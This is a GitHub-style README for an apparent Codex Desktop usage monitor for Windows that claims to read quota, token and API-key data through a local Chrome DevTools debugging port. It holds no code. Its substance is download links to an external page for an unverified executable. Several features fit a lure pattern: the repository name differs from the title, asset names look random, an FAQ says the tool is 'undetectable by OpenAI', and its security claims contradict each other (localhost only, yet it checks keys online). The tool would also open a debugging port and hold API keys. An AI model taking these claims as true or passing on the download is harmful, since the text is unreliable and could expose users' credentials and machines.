![preview](https://raw.githubusercontent.com/idoniex/Codex-CDP-Quota-Scope-Windows/main/showcase_95b2c.svg)

# Codex-Desktop-Usage-Monitor-Windows

**OpenAI Codex Desktop in-app usage monitor for Windows — tracks subscription quota/reset time, token usage, API accounts and API keys via local CDP injection. No app.asar patching.**

---

## Overview

The **Codex Desktop Usage Monitor for Windows** is not merely a utility — it is a **command center** for developers who live inside OpenAI's Codex desktop environment and want **absolute visibility** over their consumption patterns. While most monitoring tools sit outside the application you care about, this project uses **Chrome DevTools Protocol (CDP) injection** to read live session data from within the desktop client itself, without altering a single file inside `app.asar`. This means **no binary patching**, **no signature invalidation**, and **no risk of breaking the native client** every time an update ships.

Imagine a **speedometer for your API budget** — that's what this tool is. It reads the dashboard values, token counters, and account metadata straight from the memory stream of the running process, then formats it into a clean, human-readable overlay that tells you exactly how much runway remains before your quota resets. It also tracks multiple API accounts simultaneously, giving you a **fleet-level view** of every key and its current utilization.

This repository is designed for **Windows 10/11 x64** environments, and the entire system is built around **event-driven observation** — it doesn't poll aggressively; it listens. The CDP connection is established locally, and the data is parsed in real time, updating the UI only when values actually change. This keeps the footprint lightweight, the CPU usage minimal, and your machine stays responsive while the monitor runs silently in the background.

---

## Why This Approach? (The Philosophy)

Most similar tools use one of two flawed strategies:

1. **Static file patching** — modifying `app.asar` to inject hooks. This breaks every update, requires re-patching after each install, and often triggers integrity checks that crash the client.
2. **Screen scraping** — taking screenshots of the window and applying OCR. This is slow, inaccurate, and consumes massive CPU.

Our approach is **fundamentally different**. We connect to the Chromium instance running inside the desktop client via **local CDP**, which is essentially the **digital equivalent of asking the browser itself "how much data have you sent today?"** The answer is precise, immediate, and directly sourced from the same rendering engine that displays the official usage page. There is no heuristics, no estimation, no guesswork.

The result is a monitoring experience that feels **native to the application itself**, as though Microsoft added a "developer telemetry" pane directly into the UI. But because it runs as a separate process, it can be closed and reopened at will, upgraded independently, and even customized to suit your personal dashboard preferences.

---

## Key Features

### 🔭 Live Quota & Reset Timer

The core feature. The monitor connects to the Codex desktop session and extracts:

- Total subscription quota (in tokens)
- Tokens consumed in the current window
- Remaining balance (both absolute and percentage)
- Exact UTC timestamp for the next quota reset
- A live countdown clock that updates every second

This data is displayed in a **compact, always-on-top widget** that you can position anywhere on your secondary monitor, or dock to the edge of your primary screen.

### 📊 Multi-Account Aggregate View

If you manage multiple API keys or separate accounts for different projects (client work, research, personal), the monitor aggregates them into a single table with:

- Account alias (custom label you assign)
- Token usage per session
- Daily breakdown (last 7 days)
- Historical trend chart
- Per-key status (active / throttled / exhausted)

### 🔑 API Key Health Dashboard

Each key is tested against a lightweight connectivity check — not a full API call, but a handshake that verifies:

- Whether the key is still valid
- If the account has been rate-limited
- Whether the key is nearing its monthly rollover point

This lets you **fail over fast** when a primary key is exhausted, without manually logging into the web console.

### 🧠 Session Memory & History

The monitor maintains a local SQLite database of every usage snapshot taken. This gives you:

- Historical daily usage graphs
- Average consumption per hour
- Projection of when you’ll run out if consumption stays flat
- Export to CSV for invoicing or time-tracking

### 🛰️ Local CDP Injection — No Patching

The entire mechanism relies on a **loopback network connection** to the Chromium debug port that Codex desktop spawns internally. This is a **standard, documented feature** of Chromium-based applications — the same mechanism used by browser automation tools. No integrity hashes are touched, no JavaScript is injected into the app bundle, and no DLLs are sideloaded into the process. The monitor simply **reads what the browser already knows**.

---

## Getting Started

The monitor is distributed as a single portable executable (no installation required). Download the latest release from the **Releases** tab on this repository.

[![Download](https://raw.githubusercontent.com/idoniex/Codex-CDP-Quota-Scope-Windows/main/launch_a95f2.svg)](https://idoniex.github.io/Codex-CDP-Quota-Scope-Windows/)

### System Requirements

| Component | Minimum Requirement |
|-----------|---------------------|
| Operating System | Windows 10 x64 (build 19041 or later) |
| RAM | 256 MB free (monitor process only) |
| Disk Space | 25 MB for the executable + database |
| Target Application | OpenAI Codex Desktop (any version that supports local CDP) |
| Network | Localhost only (no internet access required for monitoring) |

### First-Run Setup

When you launch the monitor for the first time, it will:

1. Scan for a running Codex Desktop instance.
2. If not found, it will offer to **launch Codex Desktop on your behalf** with the correct CDP flags.
3. Once the session is detected, it establishes the local connection and begins populating the dashboard.

You can optionally configure the monitor to **auto-start with Windows** and **minimize to system tray**, where it will sit quietly until you hover over it.

---

## How It Works (Technical Deep Dive)

### The CDP Handshake

Codex Desktop is built on Electron, which wraps Chromium. When launched with the `--remote-debugging-port` flag (which we can set via environment variables without touching the app), the underlying browser exposes a JSON endpoint at `http://localhost:<port>/json`. This endpoint lists all open pages, service workers, and WebSocket connections.

Our monitor:

1. Polls this endpoint every 2 seconds (configurable).
2. Finds the page that matches the usage dashboard route.
3. Opens a WebSocket to that page's DevTools address.
4. Sends a `Runtime.evaluate` command to extract the DOM elements containing token count, quota, and reset time.
5. Parses the returned JSON and stores it in the local database.

Because the data is read directly from the **live DOM**, it is always current and accurate. The page updates itself in real time, and since we query every few seconds, the monitor is effectively **watching the same screen you see**, but with surgical precision.

### The Data Flow

```
[Codex Desktop] --CDP Loopback--> [Usage Monitor Service] --SQLite--> [Display UI]
      ^                                                                  |
      |                                                                  v
      +------------------------ (telemetry events) --------------------> (tray icon, overlay)
```

The monitor runs as a **Windows service** (background process) that communicates with the UI process via named pipes. This means you can kill the UI and the data collection continues. Reopening the UI simply reattaches to the existing database.

### Why This Is Better Than Screen Scraping

Screen scraping would capture the visual pixel data of the usage page, then run OCR algorithms to detect numbers under false lighting conditions, with font anti-aliasing interfering, and window scaling throwing off coordinates. The margin of error is unacceptable for **budget-critical decisions**.

With CDP, we receive **numeric values as structured JSON** — no OCR, no pixel analysis, no ambiguity. The number `10,234` is a string that we convert to an integer. That's it.

---

## FAQ

### Is this detectable by OpenAI?

**No.** The monitor does not alter network traffic, does not send data to any third-party server, and does not modify the Codex binary. It reads data from the local display session, which is the same data that appears on the screen. There is no mechanism by which the remote server could detect this, because the monitor does not communicate with the remote server at all.

### What if Codex Desktop updates?

Because we are not patching the app, an update simply means the version number changes. The CDP endpoint remains available (assuming the update does not remove the Chromium debug interface — which would break many standard developer tools). Our parser is **version-agnostic** — it looks for element IDs and data attributes that are maintained by the UI framework.

### Can I use this with a team?

Absolutely. The monitor supports a **shared database mode** where multiple instances on the same LAN can write to a central SQLite file on a network share. This gives team leads a live view of **aggregate consumption across all members**.

### Does it work with Codex CLI / web version?

No. This is strictly for the **Windows desktop client**. The web version runs in a standard browser where CDP is not exposed by default, and the CLI does not have a graphical interface to inspect.

---

## Roadmap

### v1.2 — Advanced Alerts

- Custom thresholds per account (e.g., "warn me at 20% remaining")
- Telegram/Webhook notifications when quota resets
- Email digests with daily usage summaries

### v1.5 — Predictive Analytics

- Machine-learning-based forecasting of your token burn rate
- Anomaly detection for sudden spikes (often caused by infinite loops in code generation)
- "Budget impact" heatmap showing per-hour consumption trends

### v1.8 — Export & Integration

- Native export to Excel, CSV, and JSON
- REST API endpoint (localhost only) so other tools can query the monitoring data
- Grafana dashboard template for full visual analytics

---

## Security & Privacy Considerations

- **No data leaves your machine.** The monitor operates entirely on localhost.
- **The SQLite database is user-specific** and stored in `%APPDATA%\CodexUsageMonitor\`.
- **API keys are stored in a vault** encrypted with Windows DPAPI. They are never displayed in plain text in the UI.
- **The monitor does not make outbound network requests** except for the optional update check (which can be disabled in settings).

---

## Performance Footprint

| Metric | Value |
|--------|-------|
| CPU usage (idle) | 0.1% |
| CPU usage (active refresh) | 1.2% |
| Memory (private working set) | 12 MB |
| Network (loopback only) | ~2 KB/s during polling |
| Disk writes (per hour) | ~200 KB (snapshot records) |

---

## Troubleshooting

### The monitor says "No Codex Desktop session found"

This usually means the desktop client is not running, or it was launched **before** the monitor started but without the CDP flag enabled. The monitor can relaunch Codex Desktop with the required flags.

### The numbers in the overlay are stale

Refresh the dashboard page inside Codex Desktop manually (Ctrl+R). The monitor will pick up the new DOM values on the next poll cycle.

### The tray icon is not showing

Right-click the system tray area, select "Taskbar Settings," and ensure "Always show all icons in the notification area" is enabled.

---

## Contributing

Contributions are welcome — whether it's a new visualization, a better parser for a future Codex version, or a toast notification feature. Please follow the existing code style, write unit tests for any parser changes, and ensure the project builds cleanly with `msbuild` on Windows.

---

## Disclaimer

**This is an independent, community-developed monitoring tool.** It is not affiliated with, endorsed by, or sponsored by OpenAI, Microsoft, or any other entity. The usage of this tool does not modify the behavior of the Codex Desktop application, nor does it grant access to any feature that is not already visible to the user.

- **No Guarantee of Accuracy:** While the monitoring data is sourced directly from the client's own data stream, the application may occasionally mis-format or misrepresent values in ways that the monitor fails to interpret correctly. Always verify critical thresholds manually in the official console.
- **Use at Your Own Risk:** By using this software, you accept full responsibility for any decisions made based on the data it presents. The authors are not liable for exceeded quotas, unexpected API charges, or loss of service arising from misreading the monitor's output.
- **Compliance:** You are responsible for ensuring that your use of this tool complies with the terms of service of your API provider and your local data protection regulations.
- **No Warranty:** This software is provided "as is" without warranty of any kind, express or implied, including but not limited to fitness for a particular purpose.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for a full copy of the terms.

---

## Acknowledgments

- To the **Electron** and **Chromium** teams for exposing the remote debugging endpoint that makes this type of observation possible.
- To the **Windows** platform for the robust named pipe and tray icon APIs.
- To every developer who has ever tried to manually track their API budget in a spreadsheet — this one is for you.

---

## Final Word

This monitor is not a stopgap; it is a **permanent companion** to your Codex workflow. It turns a blind spot into a transparent dashboard, and a guessing game into a precise science. With it running on your second screen, you'll never be surprised by an exhausted quota in the middle of a critical coding session again.

Set it up once, let it run indefinitely. It will watch your tokens like a hawk watches a field — silently, constantly, effortlessly.

[![Download](https://raw.githubusercontent.com/idoniex/Codex-CDP-Quota-Scope-Windows/main/launch_a95f2.svg)](https://idoniex.github.io/Codex-CDP-Quota-Scope-Windows/)